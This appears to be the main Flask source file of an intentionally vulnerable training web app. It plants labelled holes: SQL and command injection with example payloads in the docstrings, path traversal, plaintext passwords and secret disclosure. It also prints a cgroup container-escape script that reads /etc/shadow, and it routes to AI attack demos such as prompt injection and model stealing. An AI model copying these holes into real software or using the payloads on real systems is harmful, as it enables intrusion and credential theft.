from flask import Flask, render_template, request, redirect, url_for, flash, session, send_from_directory, jsonify
from flask_sqlalchemy import SQLAlchemy
from werkzeug.utils import secure_filename
import os
import sqlite3
import subprocess
from config import Config
from datetime import datetime
from ai_attacks import get_models

# Initialize Flask app
app = Flask(__name__)
app.config.from_object(Config)
Config.init_app(app)

# Initialize database
db = SQLAlchemy(app)

# ============================================================================
# DATABASE MODELS
# ============================================================================

class User(db.Model):
    __tablename__ = 'users'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password = db.Column(db.String(255), nullable=False)  # Plain text password (vulnerable!)
    role = db.Column(db.String(20), default='user')
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    def __repr__(self):
        return f'<User {self.username}>'

class Product(db.Model):
    __tablename__ = 'products'
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    description = db.Column(db.Text)
    price = db.Column(db.Float, nullable=False)
    stock = db.Column(db.Integer, default=0)
    
    def __repr__(self):
        return f'<Product {self.name}>'

class ActivityLog(db.Model):
    __tablename__ = 'activity_logs'
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer)
    action = db.Column(db.String(255))
    ip_address = db.Column(db.String(50))
    user_agent = db.Column(db.String(255))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    
    def __repr__(self):
        return f'<Log {self.action}>'

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def log_activity(action, user_id=None):
    """Log user activity - also vulnerable to injection"""
    try:
        log = ActivityLog(
            user_id=user_id,
            action=action,
            ip_address=request.remote_addr,
            user_agent=request.headers.get('User-Agent', 'Unknown')
        )
        db.session.add(log)
        db.session.commit()
    except:
        pass

def is_logged_in():
    """Check if user is logged in"""
    return 'user_id' in session

def get_current_user():
    """Get current logged in user"""
    if is_logged_in():
        return User.query.get(session['user_id'])
    return None

# ============================================================================
# ROUTES - HOME & INFO
# ============================================================================

@app.route('/')
def index():
    """Home page with product listing"""
    products = Product.query.all()
    return render_template('index.html', products=products)

@app.route('/about')
def about():
    """About page with system information (information disclosure)"""
    system_info = {
        'python_version': subprocess.check_output(['python3', '--version']).decode(),
        'os_info': subprocess.check_output(['uname', '-a']).decode(),
        'current_user': subprocess.check_output(['whoami']).decode().strip(),
        'working_directory': os.getcwd(),
        'environment': dict(os.environ)  # Huge vulnerability!
    }
    return render_template('about.html', system_info=system_info)

# ============================================================================
# ROUTES - AUTHENTICATION (VULNERABLE)
# ============================================================================

@app.route('/login', methods=['GET', 'POST'])
def login():
    """
    Login page - VULNERABLE TO SQL INJECTION
    Example payload: admin' OR '1'='1' --
    """
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        # VULNERABLE SQL QUERY - Direct string concatenation
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        
        try:
            # Direct database connection for SQL injection demonstration
            conn = sqlite3.connect('instance/vulnerable_app.db')
            cursor = conn.cursor()
            cursor.execute(query)  # VULNERABLE!
            user_data = cursor.fetchone()
            conn.close()
            
            if user_data:
                session['user_id'] = user_data[0]
                session['username'] = user_data[1]
                session['role'] = user_data[4]
                flash(f'Welcome back, {user_data[1]}!', 'success')
                log_activity(f'User {username} logged in')
                return redirect(url_for('dashboard'))
            else:
                flash('Invalid credentials!', 'danger')
        except Exception as e:
            # Verbose error message (information disclosure)
            flash(f'Database error: {str(e)}', 'danger')
    
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    """
    Registration page - Stores passwords in plain text
    """
    if request.method == 'POST':
        username = request.form.get('username')
        email = request.form.get('email')
        password = request.form.get('password')  # No hashing!
        
        # Check if user exists
        existing_user = User.query.filter_by(username=username).first()
        if existing_user:
            flash('Username already exists!', 'danger')
            return redirect(url_for('register'))
        
        # Create new user with plain text password
        new_user = User(username=username, email=email, password=password, role='user')
        db.session.add(new_user)
        db.session.commit()
        
        flash('Registration successful! Please login.', 'success')
        log_activity(f'New user registered: {username}')
        return redirect(url_for('login'))
    
    return render_template('register.html')

@app.route('/logout')
def logout():
    """Logout user"""
    username = session.get('username', 'Unknown')
    session.clear()
    flash('You have been logged out.', 'info')
    log_activity(f'User {username} logged out')
    return redirect(url_for('index'))

# ============================================================================
# ROUTES - DASHBOARD & SEARCH (VULNERABLE)
# ============================================================================

@app.route('/dashboard')
def dashboard():
    """User dashboard - requires login"""
    if not is_logged_in():
        flash('Please login first!', 'warning')
        return redirect(url_for('login'))
    
    user = get_current_user()
    return render_template('dashboard.html', user=user)

@app.route('/search')
def search():
    """
    Product search - VULNERABLE TO SQL INJECTION
    Example: /search?q=laptop' UNION SELECT 1,username,password,4,5 FROM users--
    """
    query = request.args.get('q', '')
    
    if query:
        # VULNERABLE SQL QUERY
        sql = f"SELECT * FROM products WHERE name LIKE '%{query}%' OR description LIKE '%{query}%'"
        
        try:
            conn = sqlite3.connect('instance/vulnerable_app.db')
            cursor = conn.cursor()
            cursor.execute(sql)  # VULNERABLE!
            results = cursor.fetchall()
            conn.close()
            
            return render_template('search.html', query=query, results=results)
        except Exception as e:
            flash(f'Search error: {str(e)}', 'danger')
            return render_template('search.html', query=query, results=[])
    
    return render_template('search.html', query='', results=[])

# ============================================================================
# ROUTES - FILE UPLOAD (VULNERABLE)
# ============================================================================

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    """
    File upload - VULNERABLE TO:
    - No file type validation
    - Arbitrary file upload
    - Path traversal
    - Remote code execution via uploaded files
    """
    if not is_logged_in():
        flash('Please login first!', 'warning')
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file selected!', 'danger')
            return redirect(request.url)
        
        file = request.files['file']
        if file.filename == '':
            flash('No file selected!', 'danger')
            return redirect(request.url)
        
        # Intentionally insecure - using user-provided filename directly
        filename = request.form.get('filename') or file.filename
        
        # No validation on file type or content!
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        flash(f'File uploaded successfully: {filename}', 'success')
        log_activity(f'File uploaded: {filename}', session.get('user_id'))
        
        return redirect(url_for('upload'))
    
    # List uploaded files
    files = []
    if os.path.exists(app.config['UPLOAD_FOLDER']):
        files = os.listdir(app.config['UPLOAD_FOLDER'])
    
    return render_template('upload.html', files=files)

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    """Serve uploaded files - vulnerable to path traversal"""
    # No path sanitization - vulnerable to ../../../etc/passwd
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

# ============================================================================
# ROUTES - COMMAND INJECTION (VULNERABLE)
# ============================================================================

@app.route('/ping', methods=['GET', 'POST'])
def ping():
    """
    Network ping utility - VULNERABLE TO COMMAND INJECTION
    Example payload: 127.0.0.1; cat /etc/passwd
    """
    if not is_logged_in():
        flash('Please login first!', 'warning')
        return redirect(url_for('login'))
    
    result = None
    if request.method == 'POST':
        host = request.form.get('host', '')
        
        # VULNERABLE - Direct command execution without sanitization
        command = f"ping -c 4 {host}"
        
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10).decode()
        except subprocess.TimeoutExpired:
            result = "Command timed out!"
        except Exception as e:
            result = f"Error: {str(e)}"
        
        log_activity(f'Ping executed: {host}', session.get('user_id'))
    
    return render_template('ping.html', result=result)

@app.route('/dns-lookup', methods=['GET', 'POST'])
def dns_lookup():
    """
    DNS lookup utility - VULNERABLE TO COMMAND INJECTION
    Example payload: google.com && whoami
    """
    if not is_logged_in():
        flash('Please login first!', 'warning')
        return redirect(url_for('login'))
    
    result = None
    if request.method == 'POST':
        domain = request.form.get('domain', '')
        
        # VULNERABLE - Another command injection vector
        command = f"nslookup {domain}"
        
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10).decode()
        except Exception as e:
            result = f"Error: {str(e)}"
        
        log_activity(f'DNS lookup: {domain}', session.get('user_id'))
    
    return render_template('dns_lookup.html', result=result)

# ============================================================================
# ROUTES - ADMIN PANEL (VULNERABLE)
# ============================================================================

@app.route('/admin')
def admin():
    """
    Admin panel - Weak access control
    Only checks if role is 'admin' in session (can be manipulated)
    """
    if not is_logged_in():
        flash('Access denied!', 'danger')
        return redirect(url_for('login'))
    
    # Weak check - session can be manipulated
    if session.get('role') != 'admin':
        flash('Admin access required!', 'danger')
        return redirect(url_for('dashboard'))
    
    users = User.query.all()
    logs = ActivityLog.query.order_by(ActivityLog.timestamp.desc()).limit(50).all()
    
    return render_template('admin.html', users=users, logs=logs)

# ============================================================================
# ROUTES - DEBUG & INFO DISCLOSURE
# ============================================================================

@app.route('/debug')
def debug():
    """Debug page - Massive information disclosure"""
    debug_info = {
        'session': dict(session),
        'cookies': dict(request.cookies),
        'headers': dict(request.headers),
        'environment': dict(os.environ),
        'config': {k: str(v) for k, v in app.config.items()},
        'database_uri': app.config['SQLALCHEMY_DATABASE_URI'],
        'secret_key': app.config['SECRET_KEY'],
    }
    return render_template('debug.html', debug_info=debug_info)

@app.route('/phpinfo')
def phpinfo():
    """Fake phpinfo - shows Python/Flask info instead"""
    info = {
        'Python Version': subprocess.check_output(['python3', '--version']).decode(),
        'Flask Version': '2.3.0',
        'Server': request.environ.get('SERVER_SOFTWARE', 'Unknown'),
        'Document Root': os.getcwd(),
        'Server Admin': 'admin@vulnerable-app.local',
    }
    return render_template('phpinfo.html', info=info)

# ============================================================================
# ROUTES - CONTAINER EXPLOITATION
# ============================================================================

@app.route('/container-info')
def container_info():
    """
    Container information disclosure
    Shows if running in Docker, permissions, escape vectors
    """
    container_data = {}
    
    try:
        # Check if running in container
        with open('/proc/1/cgroup', 'r') as f:
            cgroup = f.read()
            container_data['in_container'] = 'docker' in cgroup or 'containerd' in cgroup
            container_data['cgroup_info'] = cgroup[:500]
    except:
        container_data['in_container'] = False
        container_data['cgroup_info'] = 'Not accessible'
    
    # Get container capabilities
    try:
        caps = subprocess.check_output(['capsh', '--print'], stderr=subprocess.STDOUT).decode()
        container_data['capabilities'] = caps
    except:
        container_data['capabilities'] = 'capsh not available'
    
    # Check for Docker socket
    container_data['docker_socket'] = os.path.exists('/var/run/docker.sock')
    container_data['docker_socket_perms'] = 'Writable!' if os.access('/var/run/docker.sock', os.W_OK) else 'Not writable'
    
    # Check mount points
    try:
        with open('/proc/mounts', 'r') as f:
            mounts = f.read()
            container_data['mounts'] = mounts
    except:
        container_data['mounts'] = 'Not accessible'
    
    # Namespace information
    try:
        namespaces = os.listdir('/proc/self/ns')
        container_data['namespaces'] = namespaces
    except:
        container_data['namespaces'] = []
    
    return render_template('container_info.html', data=container_data)

@app.route('/container-escape', methods=['GET', 'POST'])
def container_escape():
    """
    Container escape techniques demonstration
    VULNERABLE: Allows testing various escape methods
    """
    if not is_logged_in():
        flash('Please login first!', 'warning')
        return redirect(url_for('login'))
    
    result = None
    if request.method == 'POST':
        technique = request.form.get('technique', '')
        
        if technique == 'docker_socket':
            # Try to access Docker socket
            try:
                cmd = 'docker ps 2>&1 || echo "Docker socket not accessible"'
                result = subprocess.check_output(cmd, shell=True).decode()
            except Exception as e:
                result = f"Error: {str(e)}"
        
        elif technique == 'privileged_escape':
            # Check if container is privileged
            try:
                result = subprocess.check_output('capsh --print', shell=True).decode()
            except Exception as e:
                result = f"Capabilities check failed: {str(e)}"
        
        elif technique == 'proc_escape':
            # Try to access host /proc
            try:
                result = subprocess.check_output('ls -la /proc/1/', shell=True).decode()
            except Exception as e:
                result = f"Proc escape failed: {str(e)}"
        
        elif technique == 'cgroup_escape':
            # Demonstrate cgroup escape technique
            result = r"""
# Classic cgroup escape (CVE-2019-5736 style)
# WARNING: This is for educational demonstration only!

mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"

# This would execute on the host when the cgroup is released!
            """
        
        log_activity(f'Container escape attempted: {technique}', session.get('user_id'))
    
    return render_template('container_escape.html', result=result)

# ============================================================================
# ROUTES - AI ATTACK LAB (Real ML implementations via ai_attacks.py)
# ============================================================================

@app.route('/ai-lab')
def ai_lab():
    """AI Attack Lab - Main dashboard"""
    return render_template('ai_lab.html')

@app.route('/ai-lab/prompt-injection', methods=['GET', 'POST'])
def ai_prompt_injection():
    """Prompt Injection Attack - Real simulation"""
    if request.method == 'POST':
        models = get_models()
        user_prompt = request.form.get('prompt', '')
        result = models['prompt_injection'].process(user_prompt)
        log_activity(f'AI Prompt Injection attempted', session.get('user_id'))
        return jsonify(result)
    return render_template('ai_prompt_injection.html')

@app.route('/ai-lab/data-poisoning', methods=['GET', 'POST'])
def ai_data_poisoning():
    """Data Poisoning Attack - Real label-flipping on digits dataset"""
    if request.method == 'POST':
        models = get_models()
        action = request.form.get('action', '')

        if action == 'classify':
            message = request.form.get('message', '')
            result = models['data_poisoning'].classify(message)
            return jsonify(result)
        elif action == 'train':
            percentage = request.form.get('percentage', 10)
            result = models['data_poisoning'].poison(percentage)
            log_activity(f'AI Data Poisoning: {percentage}% poison', session.get('user_id'))
            return jsonify(result)
        elif action == 'reset':
            result = models['data_poisoning'].reset()
            return jsonify(result)
        else:
            result = models['data_poisoning'].poison(10)
            log_activity(f'AI Data Poisoning demo', session.get('user_id'))
            return jsonify(result)

    return render_template('ai_data_poisoning.html')

@app.route('/ai-lab/adversarial-attack', methods=['GET', 'POST'])
def ai_adversarial():
    """Adversarial Attack - Real FGSM-like perturbation on classifier"""
    if request.method == 'POST':
        models = get_models()
        action = request.form.get('action', '')
        image = request.form.get('image', 'cat')

        if action == 'classify':
            result = models['adversarial'].classify(image)
            return jsonify(result)
        elif action == 'attack':
            epsilon = request.form.get('epsilon', 0.1)
            result = models['adversarial'].attack(image, float(epsilon))
            log_activity(f'AI Adversarial Attack: eps={epsilon}', session.get('user_id'))
            return jsonify(result)
        else:
            result = models['adversarial'].attack(image, 0.1)
            log_activity(f'AI Adversarial Attack demo', session.get('user_id'))
            return jsonify(result)

    return render_template('ai_adversarial.html')

@app.route('/ai-lab/model-inversion', methods=['GET', 'POST'])
def ai_model_inversion():
    """Model Inversion Attack - Real gradient-free optimization"""
    if request.method == 'POST':
        models = get_models()
        target = request.form.get('target', 'john')
        iterations = request.form.get('iterations', 500)
        result = models['model_inversion'].invert(
            target_label=1, iterations=int(iterations), target_name=target
        )
        log_activity(f'AI Model Inversion: target={target}', session.get('user_id'))
        return jsonify(result)
    return render_template('ai_model_inversion.html')

@app.route('/ai-lab/model-stealing', methods=['GET', 'POST'])
def ai_model_stealing():
    """Model Stealing Attack - Real model extraction via queries"""
    if request.method == 'POST':
        models = get_models()
        action = request.form.get('action', '')

        if action == 'query':
            text = request.form.get('text', '')
            result = models['model_stealing'].query(text)
            return jsonify(result)
        elif action == 'steal':
            queries = request.form.get('queries', 1000)
            strategy = request.form.get('strategy', 'random')
            result = models['model_stealing'].steal(int(queries), strategy)
            log_activity(f'AI Model Stealing: {queries} queries, {strategy}', session.get('user_id'))
            return jsonify(result)
        else:
            result = models['model_stealing'].steal(1000, 'random')
            log_activity(f'AI Model Stealing demo', session.get('user_id'))
            return jsonify(result)

    return render_template('ai_model_stealing.html')

@app.route('/ai-lab/backdoor', methods=['GET', 'POST'])
def ai_backdoor():
    """Backdoor Attack - Real trigger-based backdoor on classifier"""
    if request.method == 'POST':
        models = get_models()
        action = request.form.get('action', '')

        if action == 'stats':
            result = models['backdoor'].get_stats()
        elif action == 'clean':
            result = models['backdoor'].classify_clean()
        elif action == 'trigger':
            result = models['backdoor'].classify_triggered()
        else:
            result = models['backdoor'].get_stats()

        log_activity(f'AI Backdoor Attack: {action}', session.get('user_id'))
        return jsonify(result)
    return render_template('ai_backdoor.html')

@app.route('/ai-lab/bias', methods=['GET', 'POST'])
def ai_bias():
    """Overfitting & Bias Amplification - Real bias analysis"""
    if request.method == 'POST':
        models = get_models()
        action = request.form.get('action', '')

        if action == 'analyze':
            result = models['bias'].analyze_bias()
        elif action == 'predict':
            result = models['bias'].predict_individual(
                age=request.form.get('age', 35),
                education=request.form.get('education', 14),
                hours=request.form.get('hours', 40),
                experience=request.form.get('experience', 10),
                gender=request.form.get('gender', 1),
            )
        else:
            result = models['bias'].analyze_bias()

        log_activity(f'AI Bias Analysis: {action}', session.get('user_id'))
        return jsonify(result)
    return render_template('ai_bias.html')

@app.route('/ai-lab/resource-exhaustion', methods=['GET', 'POST'])
def ai_resource_exhaustion():
    """Resource Exhaustion (AI DoS) - Real timing-based attack"""
    if request.method == 'POST':
        models = get_models()
        action = request.form.get('action', '')

        if action == 'normal':
            result = models['resource_exhaustion'].normal_query()
        elif action == 'attack':
            num = request.form.get('queries', 1000)
            result = models['resource_exhaustion'].attack(int(num))
            log_activity(f'AI Resource Exhaustion: {num} queries', session.get('user_id'))
        else:
            result = models['resource_exhaustion'].normal_query()

        return jsonify(result)
    return render_template('ai_resource_exhaustion.html')

@app.route('/ai-lab/supply-chain', methods=['GET', 'POST'])
def ai_supply_chain():
    """Supply Chain Attack - IoT backdoor simulation"""
    if request.method == 'POST':
        models = get_models()
        action = request.form.get('action', '')
        command = request.form.get('command', '')

        if action == 'legitimate':
            result = models['supply_chain'].legitimate_command(command)
        elif action == 'malicious':
            result = models['supply_chain'].malicious_command(command)
            log_activity(f'AI Supply Chain: {command}', session.get('user_id'))
        elif action == 'reset':
            result = models['supply_chain'].reset()
        else:
            result = models['supply_chain'].legitimate_command(command)

        return jsonify(result)
    return render_template('ai_supply_chain.html')

@app.route('/ai-lab/human-exploit', methods=['GET', 'POST'])
def ai_human_exploit():
    """Human-AI Interaction Exploit - Social engineering via AI"""
    if request.method == 'POST':
        models = get_models()
        action = request.form.get('action', '')
        player_id = request.form.get('player_id', 'Player1')
        input_data = request.form.get('input_data', '')

        if action == 'legitimate':
            result = models['human_ai'].legitimate_interaction(player_id, input_data)
        elif action == 'malicious':
            result = models['human_ai'].malicious_interaction(player_id, input_data)
            log_activity(f'AI Human Exploit: {player_id}', session.get('user_id'))
        elif action == 'reset':
            result = models['human_ai'].reset()
        else:
            result = models['human_ai'].legitimate_interaction(player_id, input_data)

        return jsonify(result)
    return render_template('ai_human_exploit.html')

# ============================================================================
# ERROR HANDLERS - Verbose error messages
# ============================================================================

@app.errorhandler(404)
def not_found(e):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(e):
    # Verbose error message (information disclosure)
    return render_template('500.html', error=str(e)), 500

# ============================================================================
# DATABASE INITIALIZATION
# ============================================================================

def init_db():
    """Initialize database with sample data"""
    with app.app_context():
        db.create_all()
        
        # Check if already initialized
        if User.query.count() > 0:
            print("Database already initialized!")
            return
        
        # Create admin user
        admin = User(
            username='admin',
            email='admin@vulnerable-app.local',
            password='admin123',  # Plain text!
            role='admin'
        )
        db.session.add(admin)
        
        # Create regular users
        users = [
            User(username='john', email='john@example.com', password='password123', role='user'),
            User(username='alice', email='alice@example.com', password='alice2023', role='user'),
            User(username='bob', email='bob@example.com', password='qwerty', role='user'),
        ]
        db.session.add_all(users)
        
        # Create sample products
        products = [
            Product(name='Laptop', description='High performance laptop', price=999.99, stock=10),
            Product(name='Smartphone', description='Latest model smartphone', price=699.99, stock=25),
            Product(name='Headphones', description='Noise cancelling headphones', price=199.99, stock=50),
            Product(name='Tablet', description='10-inch tablet', price=399.99, stock=15),
            Product(name='Smartwatch', description='Fitness tracking smartwatch', price=299.99, stock=30),
        ]
        db.session.add_all(products)
        
        db.session.commit()
        print("Database initialized successfully!")

# ============================================================================
# MAIN
# ============================================================================

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000, debug=True)
